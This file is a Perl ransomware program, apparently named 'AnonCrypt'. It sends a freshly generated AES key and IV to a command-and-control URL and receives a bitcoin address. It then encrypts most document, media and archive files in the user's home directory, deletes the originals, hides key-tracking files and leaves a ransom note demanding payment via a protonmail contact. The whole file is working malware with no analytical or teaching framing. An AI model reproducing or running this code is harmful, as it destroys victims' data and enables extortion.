use strict;
use warnings;
use autodie;
use File::HomeDir;
use File::Spec;
use Digest::MD5 'md5_hex';
use File::Find;
use JSON::PP;
use File::Slurp;
use Path::Tiny;
use Crypt::Mode::CBC;
use Crypt::PRNG;
use HTTP::Request;
use LWP::UserAgent;
use constant CNC_URL => 'http://localhost:3000/acrypt/regkey';
my $iv  = Crypt::PRNG::random_string(16);
my $id  = Crypt::PRNG::random_string(10);
my $key = Crypt::PRNG::random_string(32);
my $kw  = Crypt::PRNG::random_string(64);
my $kwh = md5_hex($kw);
my $enc = Crypt::Mode::CBC->new('AES');
my $ua  = LWP::UserAgent->new("AnonCrypt Client");
my $req = HTTP::Request->new( POST => CNC_URL );
$req->content_type('application/x-www-form-urlencoded');
$req->content( 'key=' . $key . ':' . $iv . '&id=' . $id );
my $res = $ua->request($req);
$res->is_success || die 'Error: ' . $!;
my $out      = $res->content;
my $jdat     = JSON::PP::decode_json($out);
my $btc_addr = $jdat->{btcaddr};
find(
    sub {
        my $file = $_;
        if ( -f &&
/\.(txt|php|pl|enc|pgp|sec|asc|doc|docx|ppt|pptx|xls|xlsx|mp3|jpg|jpeg|gif|mp4|mp2|ogg|tar|gz|xz|bz2|zip|rar|7z)$/
          )
        {
            my $inp = read_file( $file, binmode => ':raw' );
            printf( "%s => %s.acrypt\n", $file, $file );
            write_file(
                $file . '.acrypt',
                { binmode => ':raw' },
                $enc->encrypt( $inp, $key, $iv )
            );
            unlink $file;
        }
    },
    File::HomeDir->my_home
);
write_file(
    File::Spec->catfile( File::HomeDir->my_home, '.keycheck.txt' ),
    { binmode => ':raw' },
    $enc->encrypt( $kw, $key, $iv )
);
write_file( File::Spec->catfile( File::HomeDir->my_home, '.kwhash.txt' ),
    $kwh );
write_file( File::Spec->catfile( File::HomeDir->my_home, '.cid.txt' ), $id );
open my $note, '>',
  File::Spec->catfile( File::HomeDir->my_desktop . 'RANSOM_NOTE.txt' );
print $note <<EOF;
All of your files are encrypted.
To decrypt please contact <gcd-union\@protonmail.com>
ID: $id
Bitcoin: $btc_addr
EOF
close $note;
if ( $^O eq 'MSWin32' ) {
    my $h = File::HomeDir->my_home;
    foreach my $f (qw(.kwhash.txt .cid.txt .keycheck.txt)) {
        my $ff = File::Spec->catfile( $h, $f );
        system("attrib +h \"$f\"");
    }
}
